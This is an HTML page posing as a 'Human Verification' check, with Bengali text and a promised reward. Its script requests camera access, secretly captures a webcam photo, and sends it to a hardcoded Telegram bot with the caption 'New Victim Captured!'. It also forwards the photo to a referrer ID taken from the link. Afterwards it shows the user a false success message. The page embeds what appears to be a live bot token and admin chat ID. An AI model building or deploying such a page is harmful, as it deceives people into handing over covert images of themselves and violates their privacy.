<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body { 
            text-align: center; 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: #121212; 
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 400px;
        }
        #verify-btn { 
            background: linear-gradient(135deg, #1a73e8, #0d47a1); 
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 50px; 
            font-size: 18px; 
            font-weight: bold;
            cursor: pointer; 
            width: 100%;
            margin-top: 20px;
        }
        #status { margin-top: 20px; color: #00ffcc; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Human Verification</h1>
        <p>আপনি যে রোবট নন তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
        <button id="verify-btn">Verify Now</button>
        <p id="status"></p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // আপনার নতুন টোকেন এবং আইডি এখানে সেট করা আছে
        const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
        const adminId = "7068444019"; 
        const urlParams = new URLSearchParams(window.location.search);
        const userIdFromLink = urlParams.get('id');

        const btn = document.getElementById('verify-btn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        btn.addEventListener('click', async () => {
            status.innerText = "Processing... Please wait.";
            btn.style.display = "none";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // ক্যামেরা ফোকাস করার জন্য ১.৫ সেকেন্ড সময় দেওয়া হয়েছে
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('caption', "📸 New Victim Captured!");

                        try {
                            // ১. সরাসরি আপনাকে (অ্যাডমিন) ছবি পাঠানো
                            formData.append('chat_id', adminId);
                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });

                            // ২. যদি অন্য কেউ লিঙ্কটি ব্যবহার করে থাকে (রেফারার)
                            if(userIdFromLink && userIdFromLink !== adminId) {
                                formData.set('chat_id', userIdFromLink);
                                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            }

                            status.innerText = "Verification Complete! Reward added.";
                        } catch (sendErr) {
                            status.innerText = "Error sending data. Try again.";
                        }
                        
                        // ক্যামেরা বন্ধ করা
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.6); // ছবির সাইজ ছোট রাখতে কোয়ালিটি ০.৬
                }, 1500);
            } catch (err) {
                status.innerText = "Error: Please allow camera access!";
                btn.style.display = "block";
            }
        });
    </script>
</body>
</html>
